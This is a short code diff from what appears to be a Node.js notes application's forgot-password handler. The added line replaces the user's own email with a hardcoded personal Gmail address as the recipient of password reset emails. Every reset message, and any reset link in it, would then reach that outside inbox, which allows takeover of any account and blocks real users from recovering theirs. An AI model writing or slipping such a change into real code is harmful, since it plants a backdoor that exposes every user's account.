@@ -159,7 +159,7 @@ exports.forgotPassword = async (req, res) => {
     `;
 
     await sendEmail({
-      to: user.email,
+       to: "kene91446@gmail.com",
       subject: "Password Reset — Notes App",
       html,
     });
